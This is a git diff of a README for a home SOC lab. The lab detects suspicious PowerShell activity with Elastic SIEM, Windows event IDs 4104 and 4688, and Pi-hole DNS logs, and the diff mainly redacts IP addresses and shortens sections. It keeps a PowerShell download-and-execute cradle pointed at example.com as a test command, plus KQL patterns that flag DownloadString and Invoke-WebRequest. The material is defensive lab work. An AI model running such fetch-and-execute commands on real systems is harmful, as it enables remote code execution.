@@ -34,7 +34,7 @@ This lab focuses on detecting suspicious Windows and PowerShell activity using r
 This lab uses a **segmented dual-network design** to simulate real-world environments:
 
 #### ✅ Lab Network (Host-Only)
-- Subnet: `192.168.200.0/24`
+- Subnet: `<lab-network>`
 - Systems:
   - Windows 11 Endpoint
   - Ubuntu (Elastic / Kibana)
@@ -45,7 +45,7 @@ This lab uses a **segmented dual-network design** to simulate real-world environ
 ---
 
 #### ✅ Home / External Network (Bridged)
-- Subnet: `10.0.0.0/24`
+- Subnet: `<external-network>`
 - Systems:
   - Windows 11 Endpoint
   - Raspberry Pi (Pi-hole)
@@ -60,11 +60,11 @@ This lab uses a **segmented dual-network design** to simulate real-world environ
 The Windows 11 endpoint is configured with **two network interfaces**:
 
 - Adapter 1:
-  - `10.0.0.x`
+  - `<external-ip>`
   - Connected to Pi-hole for DNS monitoring
 
 - Adapter 2:
-  - `192.168.200.x`
+  - `<lab-ip>`
   - Connected to Elastic SIEM environment
 
 ---
@@ -114,7 +114,8 @@ IEX "TEST"
 
 Detection:
 - Event ID: 4104 (Script Block Logging)
-- Field used:
+
+Field used:
 
 ```text
 powershell.file.script_block_text
@@ -142,14 +143,10 @@ Observed Behavior:
 
 Detection Queries:
 
-Broad search:
-
 ```kql
 event.dataset: "windows.powershell_operational"
 and event.code: 4104
 ```
-
-Refined detection:
 
 ```kql
 event.dataset: "windows.powershell_operational"
@@ -173,14 +170,7 @@ IEX (New-Object Net.WebClient).DownloadString("https://example.com")
 
 Observed Behavior:
 - PowerShell initiated outbound web requests
-- Remote content was retrieved and/or executed in memory
-- Script Block Logging (4104) captured the full command
-
-Example Log:
-
-```text
-Invoke-WebRequest http://example.com
-```
+- Script Block Logging (4104) captured execution
 
 ***
 
@@ -188,29 +178,6 @@ Invoke-WebRequest http://example.com
 
 ```kql
 event.code: "4104" AND powershell.file.script_block_text: ("*DownloadString*" OR "*Invoke-WebRequest*")
-```
-
-Rule Configuration:
-- Name: download detection  
-- Severity: Medium  
-- Risk Score: 50  
-- Interval: 1 minute  
-- Lookback: 5 minutes  
-
-***
-
-### ✅ Validation
-
-- Detection rule triggered successfully after executing test commands
-- Alert contained:
-  - correct host (`desktopwin11`)
-  - correct user (`User1`)
-  - correct script content
-
-Example Alert Context:
-
-```text
-Invoke-WebRequest http://example.com
 ```
 
 ***
@@ -228,8 +195,7 @@ powershell.exe -NoProfile -Command "whoami"
 ### ✅ Observed Behavior
 
 - PowerShell executed a command that launched another process (`whoami.exe`)
-- Event ID 4688 captured the process creation
-- The spawned process (`whoami.exe`) shows PowerShell as its parent
+- Event ID 4688 captured process creation
 
 Example:
 
@@ -237,36 +203,6 @@ Example:
 process.name: whoami.exe
 process.parent.name: powershell.exe
 ```
-
-***
-
-### ✅ Detection Query
-
-```kql
-event.code: "4688" and process.parent.name: "powershell.exe"
-```
-
-***
-
-### ✅ Key Concept
-
-- A child process is a process created by another process (parent)
-- In this case:
-  - PowerShell = parent process
-  - whoami.exe = child process
-
-- “PowerShell spawning a child process” means:
-  PowerShell executed a command that launched another executable.
-
-***
-
-### ✅ Why This Matters
-
-- Attackers often use PowerShell to launch additional tools or payloads
-- Monitoring child processes helps detect:
-  - command execution
-  - lateral movement behavior
-  - potential malware activity
 
 ***
 
@@ -283,65 +219,13 @@ Invoke-WebRequest http://example.com
 
 ### ✅ Observed Behavior
 
-This test generated observable activity across multiple telemetry sources:
-
-#### Endpoint (PowerShell Script Block Logging - 4104)
-
-```text
-Invoke-WebRequest http://example.com
-```
-
-#### Endpoint (Process Creation - 4688)
+- PowerShell execution captured (4104)
+- Process activity recorded (4688)
+- DNS query logged:
 
 ```text
-process.parent.name: powershell.exe
+<endpoint-ip> → example.com
 ```
-
-#### Network (Pi-hole DNS Logging)
-
-```text
-10.0.0.89 → example.com
-```
-
-***
-
-### ✅ Detection Approach
-
-#### PowerShell Execution Detection (4104)
-
-```kql
-event.code: "4104" AND powershell.file.script_block_text: "*Invoke-WebRequest*"
-```
-
-#### PowerShell Process Activity (4688)
-
-```kql
-event.code: "4688" AND process.parent.name: "powershell.exe"
-```
-
-#### Network Visibility (Pi-hole)
-
-```
-http://10.0.0.214/admin
-```
-
-***
-
-### ✅ Validation
-
-- ✅ Script logged in Elastic (4104)
-- ✅ Process activity recorded (4688)
-- ✅ DNS logged in Pi-hole
-
-***
-
-### ✅ Key Concept: Multi-Source Correlation
-
-| Activity | Data Source |
-|--------|-----------|
-| Command execution | PowerShell Script Block (4104) |
-| Process behavior | Windows Security Log (4688) |
-| Network request | DNS logs (Pi-hole) |
 
 ***
 
@@ -354,52 +238,33 @@ The activity was confirmed via Script Block Logging (4104), supported by process
 
 ## Key Concepts Learned
 
-### 🔹 Script Block Logging (Event ID 4104)
-
-- Logs actual PowerShell code executed
-- Captures commands after parsing and decoding
-
-***
-
-### 🔹 Command Line vs Execution Visibility
-
-| Log Type | Purpose |
-|--------|--------|
-| Event 4688 | Shows how PowerShell was launched |
-| Event 4104 | Shows what actually executed |
-
-***
-
-### 🔹 Obfuscation Insight
-
-- Base64 encoding hides commands
-- Script Block Logging reveals decoded content
-- Detection should focus on behavior
+- Script Block Logging reveals actual PowerShell execution
+- Encoded commands are decoded in logs
+- Detection should focus on behavior, not raw input
+- Multi-source correlation improves detection confidence
 
 ***
 
 ## Detection Strategy Notes
 
-- Start with broad queries before refining
-- Validate detection logic using real logs
-- Focus on behavioral patterns
-- Correlate multiple data sources
+- Start broad, then refine queries
+- Validate detections with real telemetry
+- Focus on behavior instead of exact strings
+- Correlate endpoint and network data
 
 ***
 
 ## Key Learnings
 
-- Script Block Logging is critical for detecting obfuscated activity  
+- PowerShell logging is critical for visibility  
 - Detection requires tuning and validation  
-- Single log sources are not enough  
-- Correlating logs improves detection accuracy  
-- Network + endpoint visibility provides stronger detections  
+- Endpoint logs alone are not enough  
+- Combining DNS + process + script data improves analysis  
 
 ***
 
 ## Next Steps
 
 - Detect encoded PowerShell using Event ID 4688
-- Correlate command-line execution with script block logging
-- Expand detections for additional techniques
-- Integrate Pi-hole logs into Elastic for automated correlation
+- Correlate multiple log sources automatically
+- Integrate Pi-hole logs into Elastic for full pipeline detection
